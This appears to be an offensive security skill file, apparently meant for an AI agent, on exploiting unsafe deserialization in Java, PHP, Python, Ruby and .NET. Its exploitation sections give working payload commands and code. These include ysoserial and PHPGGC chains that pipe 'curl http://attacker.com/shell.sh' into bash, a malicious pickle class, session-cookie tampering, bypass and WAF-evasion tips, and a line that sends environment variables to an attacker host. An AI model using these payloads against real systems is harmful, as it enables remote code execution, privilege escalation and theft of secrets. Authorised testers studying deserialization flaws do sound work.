---
name: deserialization
description: Unsafe deserialization attacks in Java, PHP, Python, Ruby, and .NET covering gadget chains, ysoserial, and RCE techniques
---

# Unsafe Deserialization

Deserialization vulnerabilities occur when untrusted data is deserialized into objects, allowing attackers to instantiate arbitrary classes and execute code. This is a critical RCE vector across multiple languages.

## Attack Surface

**Java**
- `ObjectInputStream.readObject()` on untrusted input
- XML deserialization (XStream, JAXB, XMLDecoder)
- JSON libraries with polymorphic type handling (Jackson `enableDefaultTyping`, Fastjson)
- RMI, JMX, JMS endpoints
- Spring Framework endpoints accepting serialized objects

**PHP**
- `unserialize()` on user input
- Session handlers using native serialization
- `phar://` wrapper triggering deserialization
- Magic methods: `__wakeup()`, `__destruct()`, `__toString()`, `__call()`

**Python**
- `pickle.loads()` on untrusted data
- `yaml.load()` without SafeLoader
- `marshal.loads()`, `shelve` module
- Django/Flask session cookies with pickle serializer

**Ruby**
- `Marshal.load()` on untrusted input
- YAML parsing with `YAML.load()` (use `safe_load`)
- Rails session cookies (CookieStore with Marshal)

**.NET**
- `BinaryFormatter.Deserialize()`
- `XmlSerializer`, `DataContractSerializer` with known types
- `JavaScriptSerializer` with type handling
- ViewState deserialization (ASP.NET WebForms)

## Detection Channels

**Static Analysis**
- Search for deserialization sinks: `readObject`, `unserialize`, `pickle.loads`, `Marshal.load`
- Trace data flow from HTTP input to deserialization call
- Check for type validation or allowlisting before deserialization

**Dynamic Analysis**
- Send malformed serialized data → observe error messages revealing class names
- Fuzz with known gadget chain payloads (ysoserial, PHPGGC)
- Monitor for OOB callbacks (DNS/HTTP) when injecting payloads

**Error-Based**
- Java: `java.io.InvalidClassException`, `ClassNotFoundException`
- PHP: `unserialize(): Error at offset`
- Python: `pickle.UnpicklingError`, `ModuleNotFoundError`

## Exploitation Techniques

### Java Gadget Chains

Use ysoserial to generate payloads:
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate payload for CommonsCollections1
java -jar ysoserial-all.jar CommonsCollections1 "curl http://attacker.com/shell.sh | bash" > payload.bin

# Common gadget chains:
# CommonsCollections1-7 (Apache Commons Collections 3.x)
# CommonsBeanutils1 (commons-beanutils)
# Spring1, Spring2 (Spring Framework)
# Hibernate1, Hibernate2
# Groovy1 (Groovy)
# Jdk7u21 (JDK 7u21)
# URLDNS (universal, triggers DNS callback)
```

Test with URLDNS first (safe, no RCE):
```bash
java -jar ysoserial-all.jar URLDNS "http://your-callback.oast.me" | base64
```

### PHP Object Injection

Generate payloads with PHPGGC:
```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
./phpggc -l  # List available chains

# Laravel/RCE1
./phpggc Laravel/RCE1 system id

# Monolog/RCE1
./phpggc Monolog/RCE1 system id

# Symfony/RCE1
./phpggc Symfony/RCE1 system id
```

Exploit via `phar://` wrapper:
```php
// Create malicious phar
$phar = new Phar('evil.phar');
$phar->setMetadata(new Exploit());
$phar->addEmptyFile('test.txt');

// Trigger via file operations
file_get_contents('phar://evil.phar/test.txt');
```

### Python Pickle

Craft malicious pickle:
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = pickle.dumps(Exploit())
# Send payload to vulnerable endpoint
```

Test with safe payload first:
```python
import pickle
import subprocess

class SafeTest:
    def __reduce__(self):
        return (subprocess.check_output, (['id'],))

payload = pickle.dumps(SafeTest())
```

### Ruby Marshal

```ruby
# Craft payload
payload = Marshal.dump(Exploit.new)

# Rails CookieStore exploitation
# Decode cookie, modify session, re-encode
require 'base64'
cookie = Base64.decode64(session_cookie.split('--')[0])
session = Marshal.load(cookie)
session[:admin] = true
new_cookie = Base64.encode64(Marshal.dump(session))
```

### .NET ViewState

```bash
# Use ysoserial.net
git clone https://github.com/pwntester/ysoserial.net.git
cd ysoserial.net

# Generate ViewState payload
./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc.exe" --apppath="/app" --path="/page.aspx"

# Decode and modify ViewState
echo "VIEWSTATE_VALUE" | base64 -d | python -m pickletools
```

## Bypass Techniques

**Java**
- LookAhead deserialization: wrap `ObjectInputStream` to peek at class name before full deserialization
- Bypass with nested objects or proxy classes
- Use `readResolve()` or `readExternal()` for alternative entry points

**PHP**
- Bypass `__wakeup()` by modifying object count in serialized string
- Use `C:` (custom serialization) instead of `O:` (object)
- Exploit `__destruct()` which runs even if `__wakeup()` throws

**Python**
- Bypass allowlists using `__builtin__` or `__import__`
- Use `copyreg` to register custom unpicklers
- Exploit `__setstate__` for post-deserialization code execution

## Validation

**Confirm RCE**
- Execute `id` or `whoami` and observe output in response or OOB channel
- Create a marker file: `touch /tmp/pwned-$(date +%s)`
- Exfiltrate environment variable: `curl http://attacker.com/?data=$(env | base64)`

**Avoid False Positives**
- Deserialization errors ≠ vulnerability (must achieve code execution)
- Check if payload actually executed (not just parsed)
- Verify gadget chain is present in classpath (Java) or installed packages (PHP/Python)

## Impact

- **Remote Code Execution**: Full system compromise
- **Authentication Bypass**: Manipulate session objects
- **Privilege Escalation**: Modify user role in deserialized session
- **Data Exfiltration**: Read sensitive files via deserialization payload

## Pro Tips

1. **Always test with URLDNS or safe payload first** - confirms deserialization without RCE risk
2. **Check classpath/dependencies** - gadget chains require specific libraries
3. **Look for custom deserialization** - apps often implement their own (insecure) parsers
4. **Test all entry points** - cookies, headers, POST body, file uploads, API parameters
5. **Chain with other vulns** - deserialization + SSRF = internal service compromise
6. **Monitor for WAF blocks** - serialize payloads may be blocked; try encoding (base64, gzip, XOR)
7. **Use curl/httpx/Python scripts for testing
